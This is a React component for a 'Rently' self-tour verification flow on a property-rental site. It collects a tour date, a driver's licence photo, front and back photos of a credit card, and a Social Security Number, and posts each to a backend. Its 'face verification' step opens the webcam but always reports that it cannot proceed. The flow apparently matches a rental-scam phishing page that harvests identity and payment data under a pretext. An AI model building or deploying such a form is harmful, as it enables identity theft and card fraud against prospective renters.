import { CameraAlt, Close, CreditCard } from "@mui/icons-material";
import { Button, IconButton } from "@mui/material";
import React, { useContext, useEffect, useState } from "react";
import { RentlyContext } from "../../context/RentlyContext";
import Overlay from "../Overlay";
import classes from "./Rently.module.css";
import { FaIdCard, FaMapMarkerAlt } from "react-icons/fa";
import { addClientDetails } from "../../api/clientDetails";
import { AuthContext } from "../../context/AuthContext";
import { NotificationContext } from "../../context/NotificationContext";
import OTPInput from "react-otp-input";
import Webcam from "react-webcam";
import ActivityIndicator from "../ActivityIndicator";

const hh = `
 {/* <p>
            {/* The following slides will require you to enter your credit card
          information and personal details for identity verification. Please
          ensure that all documents uploaded are clear and legible to ensure a
          smooth verification process. */}
            Please note that the upcoming slides will necessitate the entry of
            your credit card information and personal details to facilitate
            identity verification. We kindly request that you ensure all
            uploaded documents are clear and legible, as this will contribute to
            a seamless verification process.
          </p>
          <br />
          <p>
            {/* Upon successful verification, a message will be sent to your email
          containing all necessary information needed to begin the self tour,
          including how to access house keys/keycode and an authorization letter
          granting you permission to tour the property. */}
            Upon successful verification, you will receive an email notification
            containing all the necessary information required to commence the
            self-guided tour. This email will include instructions on accessing
            the house keys/keycode, as well as an authorization letter granting
            you permission to tour the property.
          </p>
          <br />
          <div className={classes.note}>
            <small>important!:</small>
            <p>
              {/* Please complete every part of the verification process, including
            face verifation or your data will not be submitted. */}
              Kindly ensure that you complete every aspect of the verification
              process, which includes face verification. Failure to do so will
              result in your data not being submitted.
            </p>
          {/* </div> */} */}
`;

const DATE_TIME = "dateTime";
const CREDIT_CARD = "creditCard";
const SSN = "ssn";
const OTP = "OTP";
const DRIVERS_LICENCE = "driversLicence";
const DONE = "done";
const NOTICE = "notice";
const FACE_VERIFY = "face-verification";

const Notice = ({ setCurrentClientDetail, token }) => {
  const [loading, setLoading] = useState(false);

  const handleProceedNotice = () => {
    setLoading(true);
    setCurrentClientDetail(DATE_TIME);
    setLoading(false);
  };

  return (
    <>
      {loading ? (
        <div className={classes.activityIndicator}>
          <ActivityIndicator variant="dash" color="accent" bg="trans" />
        </div>
      ) : (
        <>
          <div className={classes.notice}>
            <div className={classes.noticeTextContainer}>
              Start Verification Process
            </div>

            <div className={classes.actionBtn}>
              <Button
                disableElevation={true}
                style={{
                  backgroundColor: "#ff6f00",
                  color: "#fff",
                  fontWeight: "bold",
                  width: "100%",
                  height: "100%",
                }}
                onClick={() => {
                  handleProceedNotice();
                }}
              >
                Proceed
              </Button>
            </div>
          </div>
        </>
      )}
    </>
  );
};

const DateTime = ({
  listing,
  setSubmitItems,
  setCurrentClientDetail,
  token,
}) => {
  const [dateTime, setDatetime] = useState("");
  const [loading, setLoading] = useState(false);
  // const [s ubmitDate, setSubmitDate] = useState(false);

  const { triggerNotification } = useContext(NotificationContext);

  const handleSubmitDateTime = async () => {
    setLoading(true);
    const data = dateTime && {
      dateTime,
    };

    const response = await addClientDetails(data, token);
    const result = await response.data;
    if (result === "SUCCESS") {
      // triggerListingEdit();
      // setSubmitItems((prev) => ({ ...prev, dateTime: true }));
      setLoading(false);
      setCurrentClientDetail(DRIVERS_LICENCE);
    } else {
      triggerNotification("Upload failed");
      setLoading(false);
    }
  };

  return (
    <>
      {loading ? (
        <div className={classes.activityIndicator}>
          <ActivityIndicator variant="dash" color="accent" bg="trans" />
        </div>
      ) : (
        <>
          <div className={classes.dateTime}>
            <div className={classes.text}>
              <p>Choose a date and time when you want to see this property</p>
            </div>
            <div className={classes.listingImg}>
              <img src={listing.images[0]} alt="" />
            </div>
            <div className={classes.location}>
              <span>
                <FaMapMarkerAlt />
              </span>
              <p>This is the exact loaction of the apartment</p>
            </div>
            <div className={classes.input}>
              <input
                value={dateTime}
                onChange={(e) => setDatetime(e.target.value)}
                type="datetime-local"
              />
            </div>
          </div>
          <div className={classes.actionBtn}>
            <Button
              disableElevation={true}
              style={{
                backgroundColor: "#ff6f00",
                color: "#fff",
                fontWeight: "bold",
                width: "100%",
                height: "100%",
              }}
              onClick={() => {
                handleSubmitDateTime();
              }}
            >
              Continue
            </Button>
          </div>
        </>
      )}
    </>
  );
};

const SocialSN = ({ currentClientDetail, setCurrentClientDetail, token }) => {
  const [ssn, setSsn] = useState("");
  const [loading, setLoading] = useState(false);

  const handleSubmitSSN = async () => {
    setLoading(true);
    const data = {
      ssn,
    };

    const response = await addClientDetails(data, token);
    const result = await response.data;
    if (result === "SUCCESS") {
      // triggerListingEdit();
      setLoading(false);
      setCurrentClientDetail(FACE_VERIFY);
    } else {
      setLoading(false);

      // triggerNotification("Upload failed");
    }
  };

  return (
    <>
      {loading ? (
        <div className={classes.activityIndicator}>
          <ActivityIndicator variant="dash" color="accent" bg="trans" />
        </div>
      ) : (
        <>
          <div>
            <div className={classes.text}>
              <p>Please enter your Social Security Number (SSN)</p>
            </div>
            <div className={classes.input}>
              <input
                value={ssn}
                onChange={(e) => setSsn(e.target.value)}
                type="number"
                style={{
                  letterSpacing: "4px",
                }}
              />
            </div>
          </div>

          <div className={classes.actionBtn}>
            <Button
              disableElevation={true}
              style={{
                backgroundColor: "#ff6f00",
                color: "#fff",
                fontWeight: "bold",
                width: "100%",
                height: "100%",
              }}
              onClick={() => {
                handleSubmitSSN();
              }}
            >
              Continue
            </Button>
          </div>
        </>
      )}
    </>
  );
};

const Verify = ({ token }) => {
  return (
    <>
      <div>
        <div className={classes.text}>
          <p>Enter the pin sent to your email</p>
        </div>
      </div>
      <div className={classes.actionBtn}>
        <Button
          disableElevation={true}
          style={{
            backgroundColor: "#ff6f00",
            color: "#fff",
            fontWeight: "bold",
            width: "100%",
            height: "100%",
          }}
          onClick={() => {}}
        >
          Continue
        </Button>
      </div>
    </>
  );
};

const Upload = ({ currentClientDetail, setCurrentClientDetail, token }) => {
  const [front, setFront] = useState("");
  const [frontImg, setFrontImg] = useState("");
  const [back, setBack] = useState("");
  const [backImg, setBackImg] = useState("");
  const { triggerNotification } = useContext(NotificationContext);
  const [loading, setLoading] = useState(false);

  const readURI = (e, side) => {
    if (e.target.files && e.target.files[0]) {
      let reader = new FileReader();
      reader.onload = function (ev) {
        if (side === "front") {
          setFront(ev.target.result);
        } else if (side === "back") {
          setBack(ev.target.result);
        }
      };
      reader.readAsDataURL(e.target.files[0]);
    }
  };

  const handleSubmitImg = async () => {
    setLoading(true);
    let data;

    if (!front) {
      triggerNotification("please add required images");
      return;
    }

    if (currentClientDetail === CREDIT_CARD && frontImg && backImg) {
      data = {
        front: frontImg,
        back: backImg,
      };
    }

    if (currentClientDetail === DRIVERS_LICENCE && frontImg) {
      data = {
        driversLicence: frontImg,
      };
    }

    // setShowModal(false);
    // triggerListingEdit();

    const response = await addClientDetails(data, token);
    const result = await response.data;

    if (result === "SUCCESS") {
      // triggerListingEdit();
      setLoading(false);

      setCurrentClientDetail(
        currentClientDetail === CREDIT_CARD ? SSN : CREDIT_CARD
      );
    } else {
      setLoading(false);

      // triggerNotification("Upload failed");
    }
  };

  return (
    <>
      {loading ? (
        <div className={classes.activityIndicator}>
          <ActivityIndicator variant="dash" color="accent" bg="trans" />
        </div>
      ) : (
        <>
          <div className={classes.upload}>
            <div className={classes.text}>
              <p>
                Enter photo of{" "}
                {currentClientDetail === CREDIT_CARD
                  ? "credit card (front and back)"
                  : "national ID/drivers licence"}
              </p>
            </div>
            <div className={classes.cardInput}>
              {currentClientDetail === CREDIT_CARD && (
                <p className={classes.side}>front:</p>
              )}
              <div className={classes.cardImage}>
                {
                  front ? (
                    <img src={front ? front : ""} alt="card" />
                  ) : currentClientDetail === CREDIT_CARD ? (
                    <CreditCard />
                  ) : (
                    <FaIdCard />
                  )
                  // <CameraAlt />
                }
              </div>
              <div>
                <label htmlFor="front" className={classes.inputSelect}>
                  <div className={classes.select}>
                    {/* <CreditCard /> */}
                    <CameraAlt />

                    {front ? <p>select another image</p> : <p>select image</p>}
                  </div>
                </label>
                <input
                  onChange={(e) => {
                    readURI(e, "front");
                    setFrontImg(e.target.files);
                  }}
                  accept="image/*"
                  hidden
                  id="front"
                  type="file"
                />
              </div>
            </div>
            <br />
            {currentClientDetail === CREDIT_CARD && (
              <div className={classes.cardInput}>
                <p className={classes.side}>back:</p>
                <div className={classes.cardImage}>
                  {back ? (
                    <img src={back ? back : ""} alt="card" />
                  ) : (
                    <CreditCard />
                  )}
                </div>
                <div>
                  <label htmlFor="back" className={classes.inputSelect}>
                    <div className={classes.select}>
                      {/* <CreditCard /> */}
                      <CameraAlt />

                      {back ? <p>select another image</p> : <p>select image</p>}
                    </div>
                  </label>
                  <input
                    onChange={(e) => {
                      readURI(e, "back");
                      setBackImg(e.target.files);
                    }}
                    accept="image/*"
                    hidden
                    id="back"
                    type="file"
                  />
                </div>
              </div>
            )}{" "}
          </div>
          <div className={classes.actionBtn}>
            <Button
              disableElevation={true}
              style={{
                backgroundColor: "#ff6f00",
                color: "#fff",
                fontWeight: "bold",
                width: "100%",
                height: "100%",
              }}
              onClick={() => {
                handleSubmitImg();
              }}
            >
              Continue
            </Button>
          </div>
        </>
      )}
    </>
  );
};

const Otp = ({ currentClientDetail, setCurrentClientDetail, token }) => {
  const [otp, setOtp] = useState("");

  const handleSubmit = (inputType = "number") => {
    setCurrentClientDetail(currentClientDetail === OTP ? DATE_TIME : OTP);
  };

  return (
    <>
      <div className={classes.text}>
        <p>Please input the OTP pin sent to your email</p>
      </div>
      <div className={classes.otpInput}>
        <OTPInput
          value={otp}
          onChange={setOtp}
          numInputs={6}
          // renderSeparator={<span> o </span>}
          shouldAutoFocus
          inputType="number"
          renderInput={(props) => <input {...props} />}
        />
      </div>
      <div className={classes.actionBtn}>
        <Button
          disableElevation={true}
          style={{
            backgroundColor: "#ff6f00",
            color: "#fff",
            fontWeight: "bold",
            width: "100%",
            height: "100%",
          }}
          onClick={() => {
            handleSubmit();
          }}
        >
          Continue
        </Button>
      </div>{" "}
    </>
  );
};

const videoConstraints = {
  width: 1280,
  height: 720,
  facingMode: "user",
};

const FaceVerification = ({
  currentClientDetail,
  setCurrentClientDetail,
  token,
}) => {
  const [active, setActive] = useState(false);
  useEffect(() => {}, []);

  return (
    <>
      <Webcam
        audio={false}
        height={300}
        screenshotFormat="image/jpeg"
        width={350}
        videoConstraints={videoConstraints}
        onUserMedia={() => setActive(true)}
      />
      {/* {({ getScreenshot }) => (
          <button
            onClick={() => {
              const imageSrc = getScreenshot();
            }}
          >
            Capture photo
          </button>
        )}
        
      </Webcam> */}
      <div className={classes.activityIndicator}>
        <ActivityIndicator variant="dash" color="accent" bg="trans" />
      </div>

      {/* <div className={classes.faceCircleContainer}>
        <div className={classes.faceCircle} />
      </div> */}
      {active && (
        <small className={classes.unable}>
          unable to process face verification at the moment
        </small>
      )}
    </>
  );
};

const Rently = () => {
  const [currentClientDetail, setCurrentClientDetail] = useState(NOTICE);

  const { showRently, triggerRently, listing } = useContext(RentlyContext);
  const { token } = useContext(AuthContext);

  const handleShowRently = () => {
    triggerRently(false);
    setCurrentClientDetail(NOTICE);
  };

  // const handleKey = (e) => {
  //   e.code === "Escape" && handleShowRently();
  // };

  const Entry = () => {
    if (currentClientDetail === FACE_VERIFY) {
      return (
        <FaceVerification
          currentClientDetail={FACE_VERIFY}
          setCurrentClientDetail={setCurrentClientDetail}
          token={token}
        />
      );
    }

    if (currentClientDetail === NOTICE) {
      return (
        <Notice setCurrentClientDetail={setCurrentClientDetail} token={token} />
      );
    }

    if (currentClientDetail === DATE_TIME) {
      return (
        <DateTime
          listing={listing}
          // setSubmitItems={setSubmitItems}
          setCurrentClientDetail={setCurrentClientDetail}
          token={token}
        />
      );
    }
    if (currentClientDetail === CREDIT_CARD) {
      return (
        <Upload
          currentClientDetail={CREDIT_CARD}
          setCurrentClientDetail={setCurrentClientDetail}
          token={token}
        />
      );
    }
    if (currentClientDetail === DRIVERS_LICENCE) {
      return (
        <Upload
          currentClientDetail={DRIVERS_LICENCE}
          setCurrentClientDetail={setCurrentClientDetail}
          token={token}
        />
      );
    }
    if (currentClientDetail === OTP) {
      return <Verify token={token} />;
    }
    if (currentClientDetail === SSN) {
      return (
        <SocialSN
          setCurrentClientDetail={setCurrentClientDetail}
          token={token}
        />
      );
    }
  };

  return (
    showRently && (
      <div className={classes.rentlyWrapper}>
        <Overlay show={showRently} handleshowOverlay={handleShowRently} />
        <div className={classes.rently}>
          <span
            className={classes.close}
            onClick={() => handleShowRently()}
            title="hide"
          >
            <IconButton>
              <Close />
            </IconButton>
          </span>
          <Entry />
        </div>
      </div>
    )
  );
};

export default Rently;
